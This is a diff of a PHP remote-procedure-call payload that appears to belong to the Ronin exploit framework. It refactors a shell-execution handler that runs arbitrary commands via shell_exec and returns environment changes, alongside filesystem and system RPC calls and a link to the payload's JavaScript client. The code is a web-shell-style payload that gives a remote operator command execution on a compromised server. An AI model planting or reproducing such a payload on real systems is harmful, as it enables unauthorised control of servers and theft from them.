@@ -2,8 +2,8 @@
 
 function rpc_format_command($args)
 {
-    $program   = $args[0];
-    $arguments = array_map('escapeshellarg',array_slice($args,1,-1));
+    $program   = array_shift($args);
+    $arguments = array_map('escapeshellarg',$args);
 
     return $program . ' ' . join(' ',$arguments);
 }
@@ -105,29 +105,28 @@ function rpc_sys_getcwd($args)  { return rpc_fs_getcwd($args); }
 function rpc_sys_chdir($args)   { return rpc_fs_chdir($args); }
 function rpc_sys_time($args)    { return time(); }
 
-define('RPC_SHELL_OUTPUT_DELIMINATOR', str_repeat('#',80));
+define('RPC_SHELL_DELIMINATOR',str_repeat('#',80));
 
 function rpc_shell_exec($args)
 {
-  $command = rpc_format_command($args);
-  $command .= '; echo "' . RPC_SHELL_OUTPUT_DELIMINATOR . '"';
-  $command .= '; env';
+  $commands = Array(
+    Array('env'),
+    Array('echo', RPC_SHELL_DELIMINATOR),
+    $args,
+    Array('echo', RPC_SHELL_DELIMINATOR),
+    Array('env')
+  );
+  $command = join('; ',array_map('rpc_format_command',$commands));
 
   $output  = shell_exec($command);
 
-  list($output,$env_dump) = explode(RPC_SHELL_OUTPUT_DELIMINATOR,$output,2);
+  list($orig_env,$output,$new_env) = explode(RPC_SHELL_DELIMINATOR,$output,3);
 
   $output   = chop($output);
-  $env_dump = preg_split('/\r?\n/',trim($env_dump,"\r\n"));
-  $env      = Array();
+  $orig_env = preg_split('/\r?\n/',$orig_env);
+  $new_env  = preg_split('/\r?\n/',$new_env);
 
-  foreach ($env_dump as $name_value)
-  {
-    list($name,$value) = explode('=',$name_value,2);
-    $env[$name] = $value;
-  }
-
-  return Array('output' => $output, 'env' => $env);
+  return Array('output' => $output, 'env' => array_diff($orig_env,$new_env));
 }
 
 if (!function_exists('json_encode'))
@@ -279,7 +278,7 @@ function rpc_call($request)
   $value = call_user_func($method,$arguments);
 
   if (isset($rpc_exception)) { return Array('exception' => $rpc_exception); }
-  else                       { return Array('value' => $value);             }
+  else                       { return Array('value' => $value); }
 }
 
 define('RPC_JS_URL', 'http://ronin-ruby.github.com/data/ronin-exploits/payloads/php/rpc.js');
